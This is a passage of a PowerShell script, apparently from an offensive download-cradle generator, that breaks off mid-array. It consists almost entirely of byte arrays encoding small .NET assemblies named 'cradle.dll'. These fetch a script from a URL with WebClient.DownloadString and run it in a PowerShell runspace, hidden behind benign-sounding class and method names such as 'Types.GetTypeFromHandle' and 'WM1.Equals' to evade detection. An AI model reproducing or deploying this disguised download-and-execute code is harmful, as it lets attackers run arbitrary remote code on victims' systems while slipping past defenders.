,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,59,0,0,0,0,0,248,181,187,125,207,172,204,68,188,101,148,86,178,253,158,150,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,20,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Types'         , 'GetTypeFromHandle' , @("$CompiledHeader`28,52,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(44,35,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,180,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,216,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,80,2,0,0,8,0,0,0,35,85,83,0,88,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,104,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,106,0,74,0,6,0,138,0,74,0,10,0,190,0,179,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,68,0,15,0,2,0,0,0,1,0,175,0,17,0,68,0,19,0,25,0,68,0,15,0,33,0,68,0,15,0,33,0,200,0,24,0,9,0,68,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(168,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,121,112,101,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,84,121,112,101,70,114,111,109,72,97,110,100,108,101,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,10,254,167,79,238,44,225,79,157,152,40,177,112,84,100,232,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,84,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`44,52,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(168,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,12,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,176,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,128,3,0,0,8,0,0,0,35,85,83,0,136,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,152,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,110,0,78,0,6,0,142,0,78,0,10,0,247,0,208,0,10,0,7,1,208,0,10,0,36,1,179,0,14,0,78,1,67,1,6,0,144,1,113,1,10,0,157,1,179,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,146,32,0,0,0,0,134,24,68,0,15,0,2,0,0,0,1,0,74,0,17,0,68,0,19,0,25,0,68,0,15,0,33,0,16,1,33,0,41,0,31,1,15,0,49,0,47,1,38,0,49,0,54,1,43,0,57,0,68,0,15,0,57,0,88,1,49,0,49,0,103,1,54,0,49,0,166,1,60,0,9,0,68,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(172,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(24,0,179,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,121,112,101,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,84,121,112,101,70,114,111,109,72,97,110,100,108,101,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,32,0,0,0,0,0,74,124,104,36,0,218,226,77,137,96,251,108,175,182,56,143,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,208,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`56,52,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(236,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,68,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,208,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,176,3,0,0,8,0,0,0,35,85,83,0,184,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,200,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,128,0,96,0,6,0,160,0,96,0,10,0,9,1,226,0,10,0,25,1,226,0,10,0,54,1,197,0,14,0,96,1,85,1,6,0,121,1,36,0,6,0,176,1,145,1,10,0,189,1,197,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,157,32,0,0,0,0,134,24,68,0,16,0,3,0,0,0,1,0,74,0,0,0,2,0,78,0,17,0,68,0,20,0,25,0,68,0,16,0,33,0,34,1,34,0,41,0,49,1,16,0,49,0,65,1,39,0,49,0,72,1,44,0,57,0,68,0,16,0,57,0,106,1,50,0,65,0,128,1,55,0,49,0,135,1,62,0,49,0,198,1,68,0,9,0,68,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(190,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(25,0,197,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,121,112,101,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,84,121,112,101,70,114,111,109,72,97,110,100,108,101,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,59,0,0,0,0,0,56,209,66,189,59,195,233,67,185,154,243,233,206,170,121,99,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,20,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('WM1'           , 'Equals'            , @("$CompiledHeader`79,49,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,